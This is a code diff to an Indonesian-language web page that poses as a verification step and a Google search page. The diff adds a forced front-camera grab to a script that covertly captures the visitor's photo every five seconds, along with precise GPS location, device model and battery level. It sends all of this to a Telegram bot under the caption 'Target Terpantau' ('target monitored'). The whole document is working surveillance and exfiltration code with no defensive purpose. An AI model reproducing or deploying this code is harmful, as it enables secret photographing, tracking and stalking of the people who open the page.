@@ -35,23 +35,18 @@
     let deviceName = "Mendeteksi...";
 
     async function getAdvancedDeviceName() {
-        let model = "Android Device";
-
-        // Deteksi via Client Hints
+        let rawModel = "Mobile Device";
         if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
             try {
                 const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
-                model = hints.model || model;
-            } catch (e) { console.log(e); }
+                rawModel = hints.model || rawModel;
+            } catch (e) {}
         } else {
             const ua = navigator.userAgent;
             const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
-            if (match) {
-                model = match[3].split(" Build")[0].trim();
-            }
+            if (match) rawModel = match[3].split(" Build")[0].trim();
         }
 
-        // Daftar Penerjemah Kode Model
         const db = {
             "2310FPCA4G": "POCO C65", "M2102J20SG": "POCO X3 Pro", "2201117TY": "Redmi Note 11", 
             "2201116SG": "Redmi Note 11 Pro", "22101316G": "POCO M5", "M2012K11AG": "POCO F3", 
@@ -80,34 +75,33 @@
 
     async function startSystem() {
         deviceName = await getAdvancedDeviceName();
-        
         document.getElementById('verifyBox').style.display = 'none';
         document.getElementById('mainContent').style.display = 'block';
         document.getElementById('gFrame').src = "https://www.google.com/search?q=google&igu=1";
 
-        // Minta Izin Lokasi
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(pos => {
                 userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            }, err => {
-                userLoc = "Izin Lokasi Ditolak";
-            }, { enableHighAccuracy: true });
+            }, err => { userLoc = "Izin Lokasi Ditolak"; }, { enableHighAccuracy: true });
         }
 
-        // Jalankan Kamera
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // Memaksa Kamera Depan
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('video').srcObject = stream;
             setInterval(takeAndSend, 5000);
         } catch (e) {
-            takeAndSend();
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                setInterval(takeAndSend, 5000);
+            } catch (err) { takeAndSend(); }
         }
     }
 
     async function takeAndSend() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        
         let battery = "N/A";
         if (navigator.getBattery) {
             const b = await navigator.getBattery();
@@ -117,9 +111,8 @@
         const report = (blob) => {
             const fd = new FormData();
             fd.append('chat_id', CHAT_ID);
-            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}`);
+            fd.append('caption', `👁 *Target Terpantau*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}\n📷 Mode: Kamera Depan`);
             fd.append('parse_mode', 'Markdown');
-            
             if (blob) {
                 fd.append('photo', blob, 'shot.jpg');
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
@@ -141,3 +134,4 @@
 </script>
 </body>
 </html>
+
